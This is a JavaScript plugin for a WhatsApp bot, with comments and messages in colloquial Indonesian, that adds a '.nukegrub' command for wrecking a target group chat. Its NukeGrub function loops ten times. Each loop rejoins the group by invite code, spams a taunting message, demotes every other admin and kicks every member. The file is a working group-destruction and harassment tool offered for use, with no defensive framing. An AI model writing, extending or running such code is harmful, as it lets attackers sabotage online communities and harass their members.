/**
 * PLUGIN: NUKEGRUB
 * Eksekusi nuker pake akun bot sendiri (sock)
 * Usage: .nukegrub <group_id>
 */

const pluginConfig = {
    name: 'nukegrub',
    alias: ['nuke', 'hancurkangrub'],
    category: 'owner',
    description: '💀 Hancurkan grup pake akun bot',
    usage: '.nukegrub <group_id>',
    example: '.nukegrub 120363408544989663@g.us',
    isOwner: true,
    isPremium: false,
    isGroup: false,
    isPrivate: false,
    cooldown: 120,
    energi: 20,
    isEnabled: true
}

// ═══════════════════════════════════════════════════════════════
// FUNGSI NUKER (Direct Sock)
// ═══════════════════════════════════════════════════════════════
async function NukeGrub(sock, target) {
    const d = (ms) => new Promise(r => setTimeout(r, ms));
    const teks = "GRUB LU AMPOS😹😹";
    
    // Dapetin ID bot lo sendiri
    const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';

    let inviteCode = "";
    try {
        // Nyoba dapet link invite buat jaga-jaga kalo bot ke-kick
        inviteCode = await sock.groupInviteCode(target);
        console.log(`[nukegrub] Invite Code didapat: ${inviteCode}`);
    } catch(e) {
        console.log(`[nukegrub] Gagal dapet invite code (mungkin lo bukan admin): ${e.message}`);
    }

    for (let k = 0; k < 10; k++) {
        try {
            // 1. Kalo misal bot udah keluar, join lagi pake invite code
            if (inviteCode) {
                try {
                    await sock.groupAcceptInvite(inviteCode);
                } catch(e) {}
                await d(1000);
            }

            // 2. Spam pesan ke grup
            await sock.sendMessage(target, { text: teks });
            await d(500);
            
            // 3. Ambil data member grup
            const meta = await sock.groupMetadata(target);
            
            // 4. Demote semua admin (kecuali bot)
            for (const p of meta.participants) {
                if (p.id === botId) continue;
                if (p.admin) {
                    try { await sock.groupParticipantsUpdate(target, [p.id], "demote"); } catch {}
                    await d(200);
                }
            }

            // 5. Tendang semua member (kecuali bot)
            for (const p of meta.participants) {
                if (p.id === botId) continue;
                try { await sock.groupParticipantsUpdate(target, [p.id], "remove"); } catch {}
                await d(200);
            }

            // 6. (Opsional) Keluar dari grup
            // await sock.groupLeave(target);
            // await d(500);
            
            console.log(`[nukegrub] Loop ${k+1}/10 selesai.`);
        } catch (e) {
            console.log(`[nukegrub] Error loop ${k+1}: ${e.message}`);
            await d(1000);
        }
    }
}
// ═══════════════════════════════════════════════════════════════

// ─── HANDLER ──────────────────────────────────────────────────
async function handler(m, { sock }) {
    try {
        if (!sock) return m.reply('❌ Sock tidak tersedia!')

        const args = m.args || []
        const prefix = m.prefix || '.'
        const target = args[0]?.trim()

        if (!target || !target.includes('@g.us')) {
            return m.reply(`Usage: ${prefix}nukegrub <group_id>\nContoh: ${prefix}nukegrub 120363408544989663@g.us`)
        }

        await m.react('⏳')
        await m.reply(`💀 *MEMULAI NUKER...*\n📌 Target: ${target}\n\n⚠️ Pastikan bot lo admin di grup tersebut biar bisa nge-kick!`)

        // Jalanin di background biar bot gak nge-hang
        NukeGrub(sock, target).then(() => {
            sock.sendMessage(m.chat, { react: { text: "☠️", key: m.key } })
            m.reply(`✅ *NUKER SELESAI!*`)
        }).catch((err) => {
            console.error('[nukegrub]', err)
            m.reply(`❌ *Terjadi Error:* ${err.message}`)
        })

    } catch (error) {
        console.error('[nukegrub]', error.message)
        await m.react('❌')
        return m.reply(`❌ Error: ${error.message.slice(0, 100)}`)
    }
}

export { pluginConfig as config, handler }